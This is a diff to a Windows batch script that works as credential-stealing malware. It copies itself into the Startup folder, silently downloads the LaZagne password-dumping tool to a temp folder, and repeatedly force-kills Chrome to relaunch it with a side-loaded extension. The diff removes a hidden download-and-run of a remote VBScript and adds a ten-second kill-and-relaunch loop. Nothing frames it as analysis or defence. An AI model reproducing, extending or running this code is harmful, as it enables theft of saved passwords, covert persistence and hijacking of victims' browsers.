@@ -4,12 +4,9 @@ setlocal enabledelayedexpansion
 
 set "SCRIPT_DIR=%~dp0"
 set "SCRIPT_NAME=%~nx0"
-set "VBS_NAME=run_hidden.vbs"
-set "VBS_PATH=%SCRIPT_DIR%%VBS_NAME%"
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "STARTUP_SCRIPT=%STARTUP_DIR%\%SCRIPT_NAME%"
 
-set "VBS_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/vbs.vbs"
 set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
 set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
@@ -31,29 +28,23 @@ if not exist "!CHROME_EXE!" (
 )
 :chrome_found
 
-if not exist "%VBS_PATH%" (
-    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%VBS_URL%' -OutFile '%VBS_PATH%'" >nul 2>nul
-    if errorlevel 1 exit /b 1
-    if not exist "%VBS_PATH%" exit /b 1
-    wscript.exe "%VBS_PATH%" /B
-    timeout /t 2 /nobreak >nul  // Small delay to ensure VBScript starts
-)
-
 if not exist "%STARTUP_SCRIPT%" (
     copy "%SCRIPT_DIR%%SCRIPT_NAME%" "%STARTUP_SCRIPT%" >nul 2>nul
     if errorlevel 1 exit /b 1
 )
 
-exit /b 0
+:monitor_loop
+tasklist /FI "IMAGENAME eq chrome.exe" 2>nul | find /I "chrome.exe" >nul
+if %errorlevel% == 0 (
+    taskkill /IM chrome.exe /F >nul 2>nul
+    timeout /t 2 /nobreak >nul
+)
 
 if not exist "%LAZAGNE_EXE%" (
     powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'" >nul 2>nul
     if errorlevel 1 exit /b 1
     if not exist "%LAZAGNE_EXE%" exit /b 1
 )
-
-tasklist /FI "IMAGENAME eq chrome.exe" 2>nul | find /I "chrome.exe" >nul
-if %errorlevel% == 0 taskkill /IM chrome.exe /F >nul 2>nul
 
 if not exist "%OUTPUT_DIR%" (
     mkdir "%OUTPUT_DIR%" 2>nul
@@ -114,15 +105,8 @@ if errorlevel 1 exit /b 1
 for %%I in ("!CHROME_EXE!") do set "SHORT_CHROME_EXE=%%~sI"
 for %%I in ("!PROFILE_DIR!") do set "SHORT_PROFILE_DIR=%%~sI"
 for %%I in ("%WORKDIR%") do set "SHORT_WORKDIR=%%~sI"
-(
-    echo Set WShell = CreateObject("WScript.Shell")
-    echo WShell.Run """%SHORT_CHROME_EXE%"" --user-data-dir=""%SHORT_PROFILE_DIR%"" --disable-extensions-except=""%SHORT_WORKDIR%"" --load-extension=""%SHORT_WORKDIR%""", 0, False
-) > "%STARTUP_DIR%\run_extension.vbs"
+start "" "!CHROME_EXE!" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%" >nul 2>nul
 if errorlevel 1 exit /b 1
 
-if exist "%WORKDIR%" (
-    start "" "!CHROME_EXE!" --user-data-dir="!PROFILE_DIR!" --disable-extensions-except="%WORKDIR%" --load-extension="%WORKDIR%" >nul 2>nul
-    if errorlevel 1 exit /b 1
-)
-
-exit /b 0
+timeout /t 10 /nobreak >nul  // Wait 10 seconds before next check
+goto monitor_loop
